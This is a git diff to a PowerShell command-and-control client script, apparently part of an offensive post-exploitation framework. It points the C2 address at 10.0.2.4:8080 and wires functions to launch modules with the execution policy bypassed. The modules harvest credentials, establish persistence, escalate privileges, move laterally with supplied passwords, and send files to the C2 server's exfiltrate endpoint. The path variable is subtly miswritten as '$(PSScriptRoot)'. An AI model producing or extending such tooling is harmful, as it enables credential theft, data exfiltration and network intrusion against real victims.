@@ -9,7 +9,7 @@ param(
     [string]$Password
 )
 
-$C2_URL = "http://127.0.0.1:8000"
+$C2_URL = "http://10.0.2.4:8080"
 
 function List-Agents {
     $response = Invoke-RestMethod -Uri "$C2_URL/list_agents" -Method Get
@@ -34,17 +34,20 @@ function Fetch-Result {
 
 function Harvest-Credentials {
     Write-Output "Harvesting credentials..."
-    # Add Windows-specific credential harvesting logic
+    $scriptPath = "$(PSScriptRoot)\modules\windows\credential_harvesting.ps1"
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath" -NoNewWindow
 }
 
 function Establish-Persistence {
     Write-Output "Establishing persistence..."
-    # Add Windows-specific persistence logic
+    $scriptPath = "$(PSScriptRoot)\modules\windows\persistence.ps1"
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath" -NoNewWindow
 }
 
 function Escalate-Privileges {
     Write-Output "Attempting privilege escalation..."
-    # Add Windows-specific privilege escalation logic
+    $scriptPath = "$(PSScriptRoot)\modules\windows\privilege_escalation.ps1"
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath" -NoNewWindow
 }
 
 function Gather-System-Info {
@@ -58,7 +61,8 @@ function Exfiltrate-Data {
     param($FilePath)
     
     Write-Output "Exfiltrating data: $FilePath"
-    # Add Windows-specific exfiltration logic
+    $scriptPath = "$(PSScriptRoot)\modules\windows\exfiltration.ps1"
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath -FilePath $FilePath -C2Url $C2_URL/exfiltrate" -NoNewWindow
 }
 
 function Start-Keylogger {
@@ -72,7 +76,8 @@ function Move-Laterally {
     param($TargetIP, $Username, $Password)
     
     Write-Output "Attempting lateral movement to $TargetIP"
-    # Add Windows-specific lateral movement logic
+    $scriptPath = "$(PSScriptRoot)\modules\windows\lateral_movement.ps1"
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath -TargetIP $TargetIP -Username $Username -Password $Password" -NoNewWindow
 }
 
 function Deploy-Payload {
@@ -101,3 +106,8 @@ switch ($Command) {
     "deploy-payload" { Deploy-Payload -AgentType $AgentID }
     default { Write-Output "Unknown command" }
 }
+
+
+
+
+
